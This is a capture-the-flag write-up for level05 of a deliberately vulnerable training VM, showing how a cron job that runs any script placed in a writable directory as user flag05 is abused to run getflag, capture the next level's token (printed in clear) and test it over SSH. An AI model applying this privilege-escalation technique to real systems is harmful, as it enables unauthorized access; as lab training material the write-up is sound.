# level05

## Steps

1. __Observation__ (Guest): when connecting as the `level05` user,
	the following message appears on stdout: `You have a new mail.`

2. __Action__ (Guest): list the files present in the `/var/mail` directory
	```sh
	ls -A /var/mail
	```

3. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
	named `level05`
	```
	level05
	```

4. __Action__ (Guest): check the file access control list of the `level05` file
	```sh
	getfacl /var/mail/level05
	```

5. __Observation__ (Guest): the previous command reveals that the `level05` file
	is readable by the `level05` user
	```
	getfacl: Removing leading '/' from absolute path names
	# file: var/mail/level05
	# owner: root
	# group: mail
	user::rw-
	user:flag05:r--
	group::r--
	mask::r--
	other::r--
	```

6. __Action__ (Guest): print the content of the `/var/mail/level05` file
	```sh
	cat /var/mail/level05
	```

7. __Observation__ (Guest): the previous command reveals that the `level05` file
	contains only 1 line that strongly resembles a `crontab` directive
	```
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	```
	If it is, then it says that every 2 minutes (`*/2`), the command
	`su -c "sh /usr/sbin/openarenaserver" - flag05` shall be run, which means that the command
	`sh /usr/sbin/openarenaserver` shall be run with the `flag05` user privileges.

8. __Action__ (Guest): check the file access control list of the `openarenaserver` file
	```sh
	getfacl /usr/sbin/openarenaserver
	```

9. __Observation__ (Guest): the previous command reveals that the `openarenaserver` file
	is readable by the `level05` user
	```
	getfacl: Removing leading '/' from absolute path names
	# file: usr/sbin/openarenaserver
	# owner: flag05
	# group: flag05
	user::rwx
	user:level05:r--
	group::r-x
	mask::r-x
	other::---
	```

10. __Action__ (Guest): print the content of the `openarenaserver` file
	```sh
	cat /usr/sbin/openarenaserver
	```

11. __Observation__ (Guest): the previous command reveals that the `openarenaserver` file
	is a shell script that enumerates every non-hidden file
	located in the `/opt/openarenaserver` directory
	and runs each of them via `bash` in tracing mode (`-x`) before removing them (`rm -f`)
	```sh
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		( ulimit -t 5 ; bash -x "$i" )
		rm -f "$i"
	done
	```

12. __Action__ (Guest): check the file access control list of the `/opt/openarenaserver` directory
	```sh
	getfacl /opt/openarenaserver
	```

13. __Observation__ (Guest): the previous command reveals
	that the `/opt/openarenaserver` directory:
	- is readable by the `level05` user
	- is writable by the `level05` user
	- is executable by the `level05` user
	- is readable by the `flag05` user
	- is writable by the `flag05` user
	- is executable by the `flag05` user
	```
	getfacl: Removing leading '/' from absolute path names
	# file: opt/openarenaserver
	# owner: root
	# group: root
	user::rwx
	user:level05:rwx
	user:flag05:rwx
	group::r-x
	mask::rwx
	other::r-x
	default:user::rwx
	default:user:level05:rwx
	default:user:flag05:rwx
	default:group::r-x
	default:mask::rwx
	default:other::r-x
	```

14. __Action__ (Guest): create a simple shell script named `test.sh`
	in the `/opt/openarenaserver` directory in order to verify
	whether the cron job described in the mail is effectively running
	```sh
	#!/bin/sh

	echo "I've been run by ${USER}" | wall
	```

15. __Observation__ (Guest): at the next even minute, the following message appears on stdout:
	```
	Broadcast Message from flag05@Snow
			(somewhere) at 10:34 ...

	I've been run by flag05
	```
	confirming that the `test.sh` script has been executed by the `flag05` user

16. __Action__ (Guest): check if the `test.sh` script
	we placed in the `/opt/openarenaserver` directory has been removed
	```sh
	[ -f /opt/openarenaserver/test.sh ] && echo 'File still exists' || echo 'File has been removed'
	```

17. __Observation__ (Guest): the previous command reveals that the `test.sh` script has been removed,
	by printing the following message on stdout:  
	`File has been removed`  
	highly suggesting that the `openarenaserver` script has been run,
	and that the cron job described in the mail is effectively running.

18. __Action__ (Guest): create a new shell script named `save_token_to_file.sh`
	in the `/opt/openarenaserver` directory to invoke the `getflag` command via the cron job
	and extract the token from the usual output of the command, putting it in a hidden file
	to prevent it from being removed by the `/usr/sbin/openarenaserver` script at the next
	iteration of the cron job
	```sh
	#!/bin/sh

	getflag | egrep -o '[^ ]+$' >/opt/openarenaserver/.token
	```

19. __Action__ (Guest): wait for the next even minute

20. __Action__ (Guest): check if the `.token` file has been correctly created
	and contains the wanted token
	```sh
	cat /opt/openarenaserver/.token || echo 'File does not exist'
	```

21. __Observation__ (Guest): the previous command reveals that the file has been created,
	and seems to contains the wanted token
	```
	viuaaale9huek52boumoomioc
	```

22. __Action__ (Host): check if the token is correct by trying to connect as the `level06` user
	```sh
	sshpass -p viuaaale9huek52boumoomioc 2>/dev/null \
		ssh -p 4242 level06@192.168.122.214 exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

23. __Observation__ (Host): the previous command reveals that the token is correct,
	by printing the following message on stdout:  
	`Great! The token is correct!`

24. __Action__ (Host): copy the `.token` file from the virtual machine
	```sh
	sshpass -f level04/flag 2>/dev/null \
		scp -P 4242 level05@192.168.122.214:/opt/openarenaserver/.token level05/flag
	```

25. __Action__ (Guest): remove the `.token` file
	```sh
	rm /opt/openarenaserver/.token
	```
